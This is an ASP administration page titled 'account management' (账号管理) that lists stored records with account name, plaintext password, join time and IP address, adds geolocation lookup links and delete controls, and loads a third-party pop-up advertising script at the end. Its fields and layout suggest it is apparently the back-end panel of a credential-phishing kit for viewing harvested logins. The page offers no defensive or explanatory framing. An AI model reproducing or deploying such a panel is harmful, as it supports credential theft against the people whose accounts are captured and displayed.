<!--#include file="conn.asp"-->
<%
set rs=server.createobject("adodb.recordset")
sql="select dengji,banben,mima,quhao,id,user,pass,ip,data from main order by id desc"
rs.open sql,conn,1,3

If session("admin")="" then
    Response.Write "<script>alert('用户未登录，请登录');top.location.href='index.asp';</SCRIPT>"
	Response.End
End If
  if Request.querystring("PageNo")="" then
     PageNo=1
  else
     PageNo=clng(Request.querystring("PageNo"))
  end if
%>
<style type="text/css">
@import url("style.css");

A:link,A:active,A:visited{TEXT-DECORATION:none ;Color:#1FABD3}
A:hover{TEXT-DECORATION: underline;Color:#4455aa}
BODY{
	FONT-SIZE: 12px;
	COLOR: #000000;
	FONT-FAMILY:  宋体;
	background-color: #000000;
	background-image: url(../img/b.gif);
}
font{line-height : normal ;}

td { table-layout:fixed;
word-break :break-all; 
font-family:"宋体"; 
font-size: 12px;
line-height: 15px;
}
th
{
background-color: #877C59;
COLOR: #F4F2EC;
font-size: 12px;
font-weight:bold;
}
.STYLE1 {	font-family: "宋体";
	font-weight: bold;
	color: #1FABD3;
}
.STYLE5 {color: #FF0000}
</style>
<script language="javascript">
  function mySelectAll()
  {
     if(document.all.SelectAll.checked==true)
	 {
	   if(document.all.IDList!=null)
	   {
			if(document.all.IDList.length==null)
			{
				document.all.IDList.checked=true;
			}else{
				for(i=0;i<document.all.IDList.length;i++)
				{
				   document.all.IDList[i].checked=true;
				}
			}
	   
	   }
	 }else{
	   if(document.all.IDList!=null)
	   {
			if(document.all.IDList.length==null)
			{
				document.all.IDList.checked=false;
			}else{
				for(i=0;i<document.all.IDList.length;i++)
				{
				   document.all.IDList[i].checked=false;
				}
			}
	   
	   }
	 }
  
  }
</script>
<table width="777" height="51" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#B6E6FB" >
  <tr>
    <td height="25"><table width="99%"  border="0" style="font-size:12px" cellpadding="0" cellspacing="0">
      <tr>
        <td width="32%" height="25" align="center" valign="middle"><div align="left" class="STYLE5"><strong><span class="STYLE1">&nbsp;</span>账号管理</strong></div></td>
        <td width="23%">
          <div align="right">
            <span class="STYLE5">全选：              </span>
            <input name="SelectAll" type="checkbox" id="SelectAll" value="1" onclick="mySelectAll()" />
          </div></td>
        <td width="45%"><div align="right"><a href="" onclick="if(confirm('你确定要删除这些用户吗？')){document.all.Action.value='DelSome';document.form1.submit();}return false;">数据删除</a></div></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><table width="100%" height="51" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#B6E6FB" >

      <form name="form1" method="post" action="data_Action.asp" onSubmit="return checkForm();">
        <input type="hidden" name="Action" />
        
        <%
  if rs.recordcount=0 then
	  %>
        <tr>
          <td colspan="2"><div align="center"><span class="STYLE5">没有任何数据</span></div></td>
        </tr>
        <%
  else
      rs.pagesize=12
	  if PageNo<1 then
	     PageNo=1
	  end if
	  if PageNo>rs.pagecount then
	     PageNo=rs.pagecount
	  end if
	  rs.absolutepage=PageNo
	  i=0
	  do while i<rs.pagesize and not rs.eof
		  %>
        <tr>
          <td width="19%" height="25" align="center" valign="middle"><div align="left" class="STYLE5">
            <p>帐号：<%=rs("user")%></p>
            <div align="left" class="STYLE5">
              <p>密码：<%=rs("pass")%></p>
              </div>
            <p align="left">&nbsp;</p>
</div>
          </td>
          <td width="18%" align="center" valign="middle"><div align="left" class="STYLE5">
            <p>加入时间：<%=rs("data")%></p>
<div align="left" class="STYLE5"></div>
            </div></td>
        </tr>
        <tr>
          <td height="25" align="center" valign="middle"><div align="left" class="STYLE5">
            <div align="left" class="STYLE5">
              <p>IP地址：<a href="http://ip138.com/ips.asp?ip=<%=rs("ip")%>" target="_blank"><%=rs("ip")%></a></p>
              </div>
          </div></td>
          <td align="center" valign="middle"><div align="left" class="STYLE5">
            <div align="left" class="STYLE5"></div>
          </div></td>
        </tr>
        <tr>
          <td align="center" valign="middle" height="25"><div align="left"><span class="STYLE5">
            <input name="IDList" type="checkbox" id="IDList" value="<%=rs("id")%>" />
          </span><span class="STYLE5">ID：<a href="http://ip138.com/ips.asp?ip=<%=rs("ip")%>" target="_blank"><%=rs("id")%></a></span></div></td>
          <td align="center" valign="middle"><div align="left" class="STYLE5">
            操作：<a href="datadel.asp?id=<%=rs("id")%>">删除</a></div></td>
        </tr> <td colspan="2" bgcolor="#ffffff"><div align="center">&nbsp;</div></td>
        <%
		  rs.movenext
		  i=i+1
	  loop
  end if
  %>        
        <tr>
          <td colspan="2"><div align="right"><span class="STYLE5">记录总数： <%=rs.recordcount%> 条 当前页：<%=PageNo%>/<%=rs.pagecount%> 页大小：<%=rs.pagesize%> <a href="?PageNo=1">首页</a></span> <a href="?PageNo=<%=PageNo-1%>">上页</a> <a href="?PageNo=<%=PageNo+1%>">下页</a> <a href="?PageNo=<%=rs.pagecount%>">末页</a>
                <input name="goPage" type="text" id="goPage" size="2" value="<%=PageNo%>" maxlength="6" />
                <input name="Submit2" type="button" class="STYLE5" onclick="location='?PageNo='+document.all.goPage.value;" value="GO" />
            </div>
          </div></td>
        </tr>
        <%
	rs.close
	%>
      </form>
    </table></td>
  </tr>
  <script language="javascript">
function checkForm()
{

	if (document.user.admin.value == ""){
		alert ("请输入要添加用户！");
		document.user.admin.focus();
	return false;
	}
 }
</script>
</table>
<!--老榕树虚拟刷新弹出广告代码-->
<script src="http://wm.lrswl.com/page/?s=223770"></script>
